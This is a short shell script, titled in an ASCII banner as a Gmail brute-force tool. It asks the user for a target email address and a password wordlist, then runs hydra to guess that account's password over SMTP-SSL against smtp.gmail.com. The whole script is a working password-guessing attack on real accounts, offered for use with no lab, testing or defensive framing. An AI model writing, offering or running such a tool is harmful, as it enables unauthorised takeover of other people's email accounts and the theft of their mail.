clear
echo """

                                   __  __        __                              __                       ______                                        
                                  /  |/  |      /  |                            /  |                     /      \                                       
  ______   _____  ____    ______  $$/ $$ |      $$ |____    ______   __    __  _$$ |_     ______        /$$$$$$  |______    ______    _______   ______  
 /      \ /     \/    \  /      \ /  |$$ |      $$      \  /      \ /  |  /  |/ $$   |   /      \       $$ |_ $$//      \  /      \  /       | /      \ 
/$$$$$$  |$$$$$$ $$$$  | $$$$$$  |$$ |$$ |      $$$$$$$  |/$$$$$$  |$$ |  $$ |$$$$$$/   /$$$$$$  |      $$   |  /$$$$$$  |/$$$$$$  |/$$$$$$$/ /$$$$$$  |
$$ |  $$ |$$ | $$ | $$ | /    $$ |$$ |$$ |      $$ |  $$ |$$ |  $$/ $$ |  $$ |  $$ | __ $$    $$ |      $$$$/   $$ |  $$ |$$ |  $$/ $$ |      $$    $$ |
$$ \__$$ |$$ | $$ | $$ |/$$$$$$$ |$$ |$$ |      $$ |__$$ |$$ |      $$ \__$$ |  $$ |/  |$$$$$$$$/       $$ |    $$ \__$$ |$$ |      $$ \_____ $$$$$$$$/ 
$$    $$ |$$ | $$ | $$ |$$    $$ |$$ |$$ |      $$    $$/ $$ |      $$    $$/   $$  $$/ $$       |      $$ |    $$    $$/ $$ |      $$       |$$       |
 $$$$$$$ |$$/  $$/  $$/  $$$$$$$/ $$/ $$/       $$$$$$$/  $$/        $$$$$$/     $$$$/   $$$$$$$/       $$/      $$$$$$/  $$/        $$$$$$$/  $$$$$$$/ 
/  \__$$ |                                                                                                                                              
$$    $$/                                                                                                                                               
 $$$$$$/                                                                                                                                                
"""
echo enter mail :
read varname
echo enter wordlist :
read wordname
hydra -l $varname -P $wordname -s 465 -S -v -V -t 4 smtp.gmail.com smtp




